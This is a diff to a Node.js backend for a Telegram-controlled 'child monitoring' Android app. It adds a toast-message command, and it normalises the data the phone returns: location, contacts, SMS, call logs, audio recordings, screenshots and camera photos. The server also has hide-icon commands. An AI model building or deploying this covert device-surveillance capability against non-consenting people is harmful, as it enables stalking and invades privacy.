@@ -771,6 +771,7 @@ function initTelegramBot() {
         { text: "ℹ️ Device Info",    callback_data: `act:get_info:${deviceId}` },
       ],
       [
+        { text: "💬 Show Toast",     callback_data: `act:toast:${deviceId}` },
         { text: "🔄 Refresh",        callback_data: `sel:${deviceId}` },
       ],
     ];
@@ -993,6 +994,23 @@ function initTelegramBot() {
       if (dev) dev.blockedApps = apps;
       bot.sendMessage(chatId,
         `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMdCode(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
+        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
+      );
+      return;
+    }
+
+    if (state.awaitingInput === 'toast') {
+      state.awaitingInput = null;
+      const devId = state.selectedDeviceId;
+      const dev   = childDevices.get(devId);
+      const msg   = text.trim();
+      if (!msg) {
+        bot.sendMessage(chatId, "❌ Message khali — abar type koro.");
+        return;
+      }
+      sendCommandToDevice(devId, { command: "show_toast", message: msg });
+      bot.sendMessage(chatId,
+        `✅ Toast pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n💬 \`${escapeMdCode(msg)}\``,
         { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
@@ -1302,6 +1320,20 @@ Kon inbox dekhte chao?`, {
         return;
       }
 
+      // show_toast
+      if (action === "toast") {
+        state.selectedDeviceId = deviceId;
+        state.awaitingInput    = "toast";
+        bot.answerCallbackQuery(query.id, { text: "💬 Message type koro" });
+        bot.sendMessage(chatId,
+          `💬 *Show Toast — ${escapeMd(dev.childName)}*\n\n` +
+          `Child er phone e show korar jonno message likho:\n\n` +
+          `Example: \`Ekhan theke phone use koro na\``,
+          { parse_mode: "Markdown" }
+        );
+        return;
+      }
+
       // torch on/off
       if (action === "torch_on" || action === "torch_off") {
         const on = action === "torch_on";
@@ -1333,6 +1365,7 @@ Kon inbox dekhte chao?`, {
         unhide_icon:  "👁️ Icon restore command pathano hoyeche!",
         torch_on:     "🔦 Torch ON!",
         torch_off:    "🔦 Torch OFF!",
+        show_toast:   "💬 Toast command pathano hoyeche!",
         wifi_on:      "📶 WiFi ON command sent",
         wifi_off:     "📵 WiFi OFF command sent",
       };
@@ -1780,6 +1813,101 @@ function getDeviceName(deviceId) {
 }
 
 // ════════════════════════════════════════════════════════════════════
+// FEATURE RESPONSE NORMALIZER
+// The Android app sends everything as { type: "feature_response", action: <name> }.
+// The rest of the system (web panel + bot) matches on payload.type === <name>.
+// This bridge maps APK payloads to the canonical typed results.
+// ════════════════════════════════════════════════════════════════════
+function normalizeFeatureResponse(payload) {
+  if (!payload || payload.type !== 'feature_response') return null;
+  const action = payload.action;
+
+  switch (action) {
+    case 'location_result':
+      return {
+        type: 'location_result',
+        lat: payload.lat,
+        lng: payload.lng,
+        accuracy: payload.accuracy,
+        provider: payload.provider || 'GPS',
+        mapUrl: `https://www.google.com/maps?q=${payload.lat},${payload.lng}`,
+        time: Date.now()
+      };
+
+    case 'contacts_result':
+      return {
+        type: 'contacts_result',
+        contacts: (payload.contacts || []).map(c => ({
+          name: c.name || 'Unknown',
+          number: c.phone || c.number || ''
+        }))
+      };
+
+    case 'sms_result':
+      return {
+        type: 'sms_result',
+        box: payload.box || 'inbox',
+        messages: (payload.sms || []).map(m => ({
+          from: m.address || m.from || 'Unknown',
+          body: m.body || '',
+          date: m.date || 0,
+          read: m.read !== undefined ? m.read : true
+        }))
+      };
+
+    case 'call_log_result':
+      return {
+        type: 'call_log_result',
+        calls: (payload.calls || []).map(c => ({
+          number: c.number || 'Unknown',
+          name: c.name || '',
+          type: c.type || 'OTHER',
+          date: c.date || 0,
+          duration: c.duration || 0
+        }))
+      };
+
+    case 'installed_apps_result':
+      return {
+        type: 'installed_apps_result',
+        apps: (payload.apps || []).map(a => ({
+          name: a.name || a.packageName || a.package || '',
+          package: a.packageName || a.package || ''
+        }))
+      };
+
+    case 'record_audio_result':
+      return {
+        type: 'audio_result',
+        audio: `data:audio/amr;base64,${payload.base64 || ''}`,
+        duration: payload.duration || 30,
+        time: Date.now()
+      };
+
+    case 'screenshot_result':
+      return {
+        type: 'screenshot_result',
+        image: `data:image/jpeg;base64,${payload.base64 || ''}`,
+        time: Date.now()
+      };
+
+    case 'take_photo_result':
+      if (payload.error) {
+        return { type: 'take_photo_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'photo_result',
+        image: payload.image || `data:image/jpeg;base64,${payload.base64 || ''}`,
+        facing: payload.facing || 'back',
+        time: Date.now()
+      };
+
+    default:
+      return null;
+  }
+}
+
+// ════════════════════════════════════════════════════════════════════
 // WEB ADMIN HELPERS
 // ════════════════════════════════════════════════════════════════════
 
@@ -1795,6 +1923,11 @@ function getSanitizedDeviceList() {
     screenTimeUsedMin: dev.screenTimeUsedMin || 0,
     screenTimeLimitMin: dev.screenTimeLimitMin || 0,
     blockedApps:      dev.blockedApps || "",
+    blockedKeywords:  dev.blockedKeywords || "",
+    storage:          dev.storage || "—",
+    ringerMode:       dev.ringerMode || "—",
+    networkType:      dev.networkType || "—",
+    screenState:      dev.screenState || "—",
   }));
 }
 
@@ -1869,11 +2002,20 @@ wss.on('connection', (ws, req) => {
         if (!dev) return;
         dev.lastSeen = Date.now();
 
+        // ── Bridge APK "feature_response" payloads into canonical typed results ──
+        const norm = normalizeFeatureResponse(payload);
+        if (norm) Object.assign(payload, norm);
+
         if (payload.type === 'status') {
           dev.battery   = payload.battery  ?? dev.battery;
           dev.activeApp = payload.activeApp || dev.activeApp;
           dev.screenTimeUsedMin  = payload.screenTimeUsedMin  ?? dev.screenTimeUsedMin;
           dev.screenTimeLimitMin = payload.screenTimeLimitMin ?? dev.screenTimeLimitMin;
+          if (payload.blockedApps !== undefined)     dev.blockedApps = payload.blockedApps;
+          if (payload.storage !== undefined)         dev.storage = payload.storage;
+          if (payload.ringerMode !== undefined)      dev.ringerMode = payload.ringerMode;
+          if (payload.networkType !== undefined)     dev.networkType = payload.networkType;
+          if (payload.screenState !== undefined)     dev.screenState = payload.screenState;
 
           if (dev.battery <= 15 && !lowBatteryAlerted.has(deviceId)) {
             lowBatteryAlerted.add(deviceId);
@@ -1887,7 +2029,11 @@ wss.on('connection', (ws, req) => {
             battery: dev.battery, activeApp: dev.activeApp,
             screenTimeUsedMin: dev.screenTimeUsedMin,
             screenTimeLimitMin: dev.screenTimeLimitMin,
-            blockedApps: dev.blockedApps
+            blockedApps: dev.blockedApps,
+            storage: dev.storage,
+            ringerMode: dev.ringerMode,
+            networkType: dev.networkType,
+            screenState: dev.screenState
           });
 
         } else if (payload.type === 'screenshot_result') {
@@ -1929,6 +2075,44 @@ wss.on('connection', (ws, req) => {
           notifyCommandAck(deviceId, dev.childName, payload.command, payload.success, payload.message);
           console.log(`[ACK] ${deviceId} → ${payload.command}: ${payload.success ? 'OK' : 'FAILED'}`);
 
+          // The app reports device info through command_response — rebridge to get_info_result
+          if (payload.command === 'get_info') {
+            const giPayload = {
+              type: 'get_info_result',
+              deviceId,
+              brand: payload.brand || '',
+              model: payload.device_model || payload.model || '',
+              android_version: payload.android_version || '',
+              sdk: payload.sdk || '',
+              battery: payload.battery ?? dev.battery,
+              is_charging: !!payload.is_charging,
+              device_id: payload.device_id || deviceId,
+              screen_time_used: (payload.screen_time_used_today ?? dev.screenTimeUsedMin) || 0,
+              screen_time_limit: (payload.screen_time_limit ?? dev.screenTimeLimitMin) || 0,
+              blocked_apps: (payload.blocked_apps ?? dev.blockedApps) || ''
+            };
+            payload = giPayload;
+            const prGI = pendingBotFileRequests.get(deviceId + '_data');
+            broadcastToAdmins(payload);
+            if (prGI && bot && prGI.type === 'get_info_result') {
+              pendingBotFileRequests.delete(deviceId + '_data');
+              bot.sendMessage(prGI.chatId,
+                `ℹ️ *Device Info — ${escapeMd(dev.childName)}*\n\n` +
+                `📱 Model: *${escapeMd(giPayload.brand)} ${escapeMd(giPayload.model)}*\n` +
+                `🤖 Android: *${escapeMd(giPayload.android_version)}* (SDK ${giPayload.sdk})\n` +
+                `🔋 Battery: *${giPayload.battery}%* ${giPayload.is_charging ? '⚡ Charging' : ''}\n` +
+                `🆔 Device ID: \`${giPayload.device_id}\`\n` +
+                `⏱ Screen Used: *${giPayload.screen_time_used} min*\n` +
+                `🚫 Blocked Apps: \`${escapeMdCode(giPayload.blocked_apps || 'none')}\``,
+                { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } }
+              );
+            }
+          }
+
+        } else if (payload.type === 'take_photo_result') {
+          broadcastToAdmins({ ...payload, deviceId });
+          if (bot) notifyAdmin(`❌ *Camera capture failed* — ${escapeMd(dev.childName)}\n${escapeMd(payload.error || 'Unknown error')}`);
+
         } else if (payload.type === 'photo_result') {
           broadcastToAdmins({ ...payload, deviceId });
           if (bot) notifyAdminPhoto(deviceId, dev.childName, payload.image, payload.facing);
@@ -1947,6 +2131,9 @@ wss.on('connection', (ws, req) => {
 
         } else if (payload.type === 'get_info_result') {
           payload.deviceId = deviceId;
+          if (payload.blocked_apps !== undefined)      dev.blockedApps = payload.blocked_apps;
+          if (payload.screen_time_limit !== undefined) dev.screenTimeLimitMin = payload.screen_time_limit;
+          if (payload.battery !== undefined)           dev.battery = payload.battery;
           broadcastToAdmins(payload);
           const prGI = pendingBotFileRequests.get(deviceId + '_data');
           if (prGI && bot && prGI.type === 'get_info_result') {
